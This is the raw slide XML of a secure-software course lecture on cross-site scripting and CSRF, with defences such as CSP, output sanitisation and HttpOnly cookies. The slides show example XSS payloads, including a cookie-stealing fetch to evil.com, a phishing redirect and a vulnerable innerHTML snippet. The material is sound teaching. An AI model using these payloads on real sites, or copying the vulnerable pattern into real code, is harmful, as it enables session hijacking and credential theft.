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80" r:id="rId2"/>
    <p:sldId id="639" r:id="rId3"/>
    <p:sldId id="642" r:id="rId4"/>
    <p:sldId id="643" r:id="rId5"/>
    <p:sldId id="644" r:id="rId6"/>
    <p:sldId id="645" r:id="rId7"/>
    <p:sldId id="647" r:id="rId8"/>
    <p:sldId id="666" r:id="rId9"/>
    <p:sldId id="667" r:id="rId10"/>
    <p:sldId id="665" r:id="rId11"/>
    <p:sldId id="662" r:id="rId12"/>
    <p:sldId id="668" r:id="rId13"/>
    <p:sldId id="669" r:id="rId14"/>
    <p:sldId id="660" r:id="rId15"/>
    <p:sldId id="670" r:id="rId16"/>
    <p:sldId id="372" r:id="rId17"/>
  </p:sldIdLst>
  <p:sldSz cx="9906000" cy="6858000" type="A4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C4F4344-209C-4F70-85AC-9C0340846E2F}">
          <p14:sldIdLst>
            <p14:sldId id="280"/>
            <p14:sldId id="639"/>
            <p14:sldId id="642"/>
            <p14:sldId id="643"/>
            <p14:sldId id="644"/>
            <p14:sldId id="645"/>
            <p14:sldId id="647"/>
            <p14:sldId id="666"/>
            <p14:sldId id="667"/>
            <p14:sldId id="665"/>
            <p14:sldId id="662"/>
            <p14:sldId id="668"/>
            <p14:sldId id="669"/>
            <p14:sldId id="660"/>
            <p14:sldId id="670"/>
            <p14:sldId id="372"/>
          </p14:sldIdLst>
        </p14:section>
        <p14:section name="无标题节" id="{3A58C67D-E970-4AF9-96C5-84664AA55BD8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306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1C0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854" autoAdjust="0"/>
    <p:restoredTop sz="92886" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="119" d="100"/>
          <a:sy n="119" d="100"/>
        </p:scale>
        <p:origin x="1720" y="184"/>
      </p:cViewPr>
      <p:guideLst>
        <p:guide orient="horz" pos="2306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90" d="100"/>
        <a:sy n="19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F613-6386-45E1-B87F-1E8A4FD761EB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E6104B-F43C-4180-A305-CEC1284C5FF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70897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64180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200150" y="1143000"/>
            <a:ext cx="44577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E6104B-F43C-4180-A305-CEC1284C5FF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770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01A63-A7C4-4D9E-8336-1A8A451B13AA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AB7285-B0D8-4CCE-9696-7B972DFD7D37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75878" y="1709738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75878" y="4589464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907B5-A00F-4D95-A944-352881DC976F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28D666-1070-47A4-93DD-CDEF7BD1F6B1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365126"/>
            <a:ext cx="8543925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682328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82328" y="2505075"/>
            <a:ext cx="4190702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D1CCC7-9EDE-420E-93DD-85D8C3590620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38E457-A80F-46AA-AB73-6563C30B8F07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D494D2-7C33-4737-9BFA-E0AD9F259636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A0A1E-52E8-41CF-B036-B709E3BEEE64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211340" y="987426"/>
            <a:ext cx="501491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CCECB7-59A1-4697-8604-3431EA5C9D9C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5824D-C0BA-4384-BF05-F9F894E8B242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88981" y="365125"/>
            <a:ext cx="2135981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681037" y="365125"/>
            <a:ext cx="6284119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ACE58A-A4F5-4361-A1B6-594D0881072F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81038" y="365126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81038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694028-4A59-403E-B211-633674C4AE82}" type="datetime1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281363" y="6356351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996113" y="6356351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58AAF-F958-4141-BDE8-5609689A4508}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="zh-CN" alt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B86DBDA-7A39-5940-BAEA-489B2396DCC4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419" y="-11699"/>
            <a:ext cx="1165087" cy="10453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goQlKiynWXU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" y="1654175"/>
            <a:ext cx="9905999" cy="47212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endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="it-IT" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Cross-Site Scripting &amp; More!! </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/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algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49155" name="AutoShape 3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6" name="AutoShape 4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49157" name="AutoShape 5" descr="C:\Users\W10\AppData\Roaming\Tencent\Users\794473416\QQ\WinTemp\RichOle\XO7~@R[DK0Y$4$RD6Y5[U.png"/>
          <p:cNvSpPr>
            <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="304800" cy="304800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9A99ADA-48C1-EC4B-A15E-7A2B09F5ECE8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2489571" y="1220297"/>
            <a:ext cx="47288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Secure Software Design and Development</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>(CY-321)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801031D-AE74-0A4A-9CAF-7265597EA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2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BE1A33-58B6-A74E-92F6-292FA871A53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070"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="1115122"/>
            <a:ext cx="9906000" cy="5285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609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303D178-6191-1647-B313-1E7A2A859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2FD322-9F6B-534B-AB88-385AB4042649}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="289931" y="2570577"/>
            <a:ext cx="924237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index.html?name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&lt;script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alert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'Hacked!'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/script&gt;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076ABF5-5D56-7341-9F8C-ADAD0B06FC4C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="289932" y="1237115"/>
            <a:ext cx="248016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Basic XSS Attack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AFDECF-54E9-8944-BA60-23D5B618AC0C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="338984" y="1916191"/>
            <a:ext cx="486222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The attacker sends the victim the following link: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C073D41-CF36-3E47-B2B6-F0A221D0828D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="289931" y="3488540"/>
            <a:ext cx="727059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the victim clicks on this link, their browser executes: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324C378-4BA8-744D-B7B5-B01862B1AD8C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="486466" y="4278798"/>
            <a:ext cx="4363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&lt;script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alert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'Hacked!'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/script&gt;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BE7BD52-359C-D142-8F94-489766CFF400}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="486465" y="5185967"/>
            <a:ext cx="873849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Result: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The victim sees a popup alert showing "Hacked!", proving that JavaScript execution is possible.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6ECDD67-10C1-2A42-9F2E-15C42DBBAEA4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="125259" y="463688"/>
            <a:ext cx="5035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2912864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4C1C63D-C1C7-3644-9DC3-BFBA0BB38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EE89F2-1A5B-214B-89D6-5EB7040D0B75}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="328656" y="1170207"/>
            <a:ext cx="521168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Stealing Cookies (Session Hijacking)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BFDC895-4C36-414F-B23E-F7DDDCE37B3A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457996" y="2008330"/>
            <a:ext cx="944800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index.html?name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=&lt;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sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent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fetch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'http://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evil.com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sz="1600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steal?cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600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='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+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent4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document</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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.cookie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)&lt;/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="16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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="16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1675AD3-595C-7048-870A-7A0DCE782D43}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2476500" y="3105835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This script steals the victim cookies and sends them to an attacker's server (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>evil.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>).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58F32A-48E5-E441-A4B0-C7C174D51EA8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2476500" y="4084762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authentication tokens are stored in cookies, the attacker can impersonate the victim.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018AC6-73B1-F74C-BD2D-06796EB3F875}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="125259" y="463688"/>
            <a:ext cx="5035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3623724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B197F2-3FFF-5645-969D-3BD911001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0955C9B-AE9E-B945-B46F-3EACA3ECA386}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="199686" y="1192510"/>
            <a:ext cx="47740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/>
              <a:t>Redirecting to a Fake Login Page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7CC2994-00B2-4B41-842D-E88AFBBED0A1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="513885" y="2097539"/>
            <a:ext cx="909846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index.html?name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=&lt;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  <a:r>
              <a:rPr lang="en-US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window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.location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'http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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evil.com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/phishing'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&lt;/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script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3BB7885-9070-9843-9FA1-6E1E01D738D5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2497250" y="4943490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If they enter credentials, the attacker steals their username &amp; password.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87DC05-90E4-DD41-A875-D86C1835C401}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2497250" y="3853794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victim is redirected to http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>evil.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/phishing, a fake login page.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1FDD186-D720-ED4B-B92B-140D49797707}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="125259" y="463688"/>
            <a:ext cx="5035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2854615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6FAE9C-46F1-6E4C-AF77-8CBB6A0C3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6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2CD4E51-B648-B048-9B4F-2497E89F6217}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="313163" y="2120760"/>
            <a:ext cx="8674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document.getElementById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'results'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).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innerHTML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"Showing results for "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 + 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location.search.split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('=')[1];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D6B6468-C7ED-2D4C-B443-464F97598864}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="513420" y="3587660"/>
            <a:ext cx="898788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https://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example.com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n-US" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:cs typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>index.html?query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=&lt;script&gt;alert(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'Hacked!'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)&lt;/script&gt;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C2B750C-D797-564D-9A54-B7F0E0DE0EDF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1894778" y="4961577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&lt;div id=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent6">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>"results"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    Showing results for &lt;script&gt;alert(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent6">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>'Hacked!'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;/div&gt;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3CC1F2-9CA0-0A45-BF50-0A4D62825BA6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="245327" y="1072143"/>
            <a:ext cx="41259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DOM Based XSS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47C19A5-BE3B-2B45-8AAF-A5393111806E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="413523" y="3006280"/>
            <a:ext cx="16642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Malicious URL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B63C25A-5386-6341-B685-BF431CF040EB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="313163" y="4371841"/>
            <a:ext cx="8911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When the victim visits this link, the browser processes the JavaScript inside </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>innerHTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/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FEE344-DA28-F742-9C78-C504521B6E69}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="125259" y="463688"/>
            <a:ext cx="50354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Cross-Site Scripting (XSS)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2412218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7E179-382E-204B-A9C5-2ECD179C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A495C-DA73-DF43-A9F6-9A92FABF8338}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="150312" y="400024"/>
            <a:ext cx="403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to Tackle XSS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0D7096-DDDC-994B-9D63-D32B182886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8711" y="1128755"/>
            <a:ext cx="3649384" cy="269658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76157C25-B923-204C-9913-BFA87AD1ECA9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="150311" y="1128755"/>
            <a:ext cx="4033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Same Origin Policy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95AD11D-CBE3-1F43-BF91-34E57FCC704A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="486337" y="1734376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>
                <a:solidFill>
                  <a:srgbClr val="001D35"/>
                </a:solidFill>
                <a:latin typeface="Google Sans"/>
              </a:rPr>
              <a:t>A fundamental browser security mechanism that prevents scripts on one webpage (origin A) from accessing sensitive data, such as cookies, DOM, or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001D35"/>
                </a:solidFill>
                <a:latin typeface="Google Sans"/>
              </a:rPr>
              <a:t>localStorage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001D35"/>
                </a:solidFill>
                <a:latin typeface="Google Sans"/>
              </a:rPr>
              <a:t>, on another webpage (origin B)</a:t>
            </a:r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93ACED7-E9B5-5841-A510-363F33C8AE01}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="479688" y="3745837"/>
            <a:ext cx="934204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A0A0A"/>
                </a:solidFill>
                <a:latin typeface="Google Sans"/>
              </a:rPr>
              <a:t>An origin is defined by the URI scheme (protocol), hostname (domain), and port number. For example, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>http://example.com:80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is considered a different origin from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>https://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>example.com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(different protocol) or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>api.example.com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(different host).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8748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7E179-382E-204B-A9C5-2ECD179C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A495C-DA73-DF43-A9F6-9A92FABF8338}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="150312" y="400024"/>
            <a:ext cx="403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to Tackle XSS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57C25-B923-204C-9913-BFA87AD1ECA9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="150311" y="1128755"/>
            <a:ext cx="4033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Content Security Policy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42D4AB-8253-0842-9841-98771B5E661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36" b="17515"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="2108499"/>
            <a:ext cx="9906000" cy="2947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074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7E179-382E-204B-A9C5-2ECD179C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9</a:t>
            </a:fld>
            <a:endParaRPr lang="zh-CN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A495C-DA73-DF43-A9F6-9A92FABF8338}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="150312" y="400024"/>
            <a:ext cx="403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to Tackle XSS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157C25-B923-204C-9913-BFA87AD1ECA9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="150311" y="1128755"/>
            <a:ext cx="40333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Content Security Policy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A5A928-8A53-D148-BF1F-6184AAA0D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9685" y="1902684"/>
            <a:ext cx="4826000" cy="328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520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7E179-382E-204B-A9C5-2ECD179C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10</a:t>
            </a:fld>
            <a:endParaRPr lang="zh-CN" alt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35A912B-1627-F24F-9D9B-CC478FBC9E63}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1829729" y="1754957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Handle the output to the client only after it is sanitized </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="ArialMT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E6E7F9-6A2A-6342-931F-8AE8720EED85}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1829729" y="3270465"/>
            <a:ext cx="627812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Validating user supplied input with a whitelist </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="ArialMT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01B37C1-C24F-204B-9E45-66FA71D9A61D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1808792" y="4324309"/>
            <a:ext cx="564419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Use the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="AGaramondPro"/>
              </a:rPr>
              <a:t>innerText</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="AGaramondPro"/>
              </a:rPr>
              <a:t> properties of HTML controls instead of the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="AGaramondPro"/>
              </a:rPr>
              <a:t>innetHtml</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="AGaramondPro"/>
              </a:rPr>
              <a:t> property when storing the input supplied </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Arial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EA495C-DA73-DF43-A9F6-9A92FABF8338}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="150312" y="400024"/>
            <a:ext cx="403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to Tackle XSS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="366730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D7E179-382E-204B-A9C5-2ECD179CB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11</a:t>
            </a:fld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BB1817E-3E53-2646-A105-4BB4AC74140E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1766923" y="1556636"/>
            <a:ext cx="634103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Use secure libraries and encoding frameworks </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="ArialMT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A045DB5-1740-624D-BABF-6EE1D7F26388}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1741504" y="2560686"/>
            <a:ext cx="66634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The client can be secured by disabling the active scripting option in the browser so that scripts are not automatically executed on the browser </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="ArialMT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F36910B-14DC-8044-B68D-6E4D756856CD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1766922" y="4303400"/>
            <a:ext cx="631236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AGaramondPro"/>
              </a:rPr>
              <a:t>Use the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="AGaramondPro"/>
              </a:rPr>
              <a:t>HTTPOnly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="AGaramondPro"/>
              </a:rPr>
              <a:t> flag on the session or any custom cookie </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="ArialM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A0DF738-DF1E-0148-8C1A-94092A22F98F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="150312" y="400024"/>
            <a:ext cx="40333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Rules to Tackle XSS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2966698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15324BB-EE83-2C4F-A6C4-AE8AB42D8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9C504A-245C-314C-BE8C-EFB46D0684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088"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4553754" y="1349162"/>
            <a:ext cx="5080000" cy="2618591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692B278-F258-D44E-8515-85AB58E54EF2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="343337" y="1300858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A user logs into their online banking account at </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent6">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>bank.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>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C3E6ACD-6044-9C4E-9519-CFFE1DF677E8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="343337" y="2559594"/>
            <a:ext cx="4953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Their session remains active as they browse the internet.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B33818-C4C1-AC4E-B8C5-4BC5AC4C04CA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="343337" y="4320273"/>
            <a:ext cx="4953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victim visits the attacker's website while still logged into their bank account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EE661E-B407-A14F-9F3E-82F9AB93E871}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="343337" y="5319124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malicious script automatically submits a request to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>bank.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, using the victims active session.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24F0CA4-FF10-9640-9099-C2EB4E88935B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="486673"/>
            <a:ext cx="3986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Cross-Site Request Forgery</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="161687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6AA01A9-0D70-434D-8FD4-D60F05FA21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13</a:t>
            </a:fld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7D09989-BD52-2B43-BC5E-545D8D12963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485"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1701800" y="2130014"/>
            <a:ext cx="6502400" cy="312778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76556DC-19E5-CD46-AA64-28C7C89D0AB8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="486673"/>
            <a:ext cx="39869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Cross-Site Request Forgery</a:t>
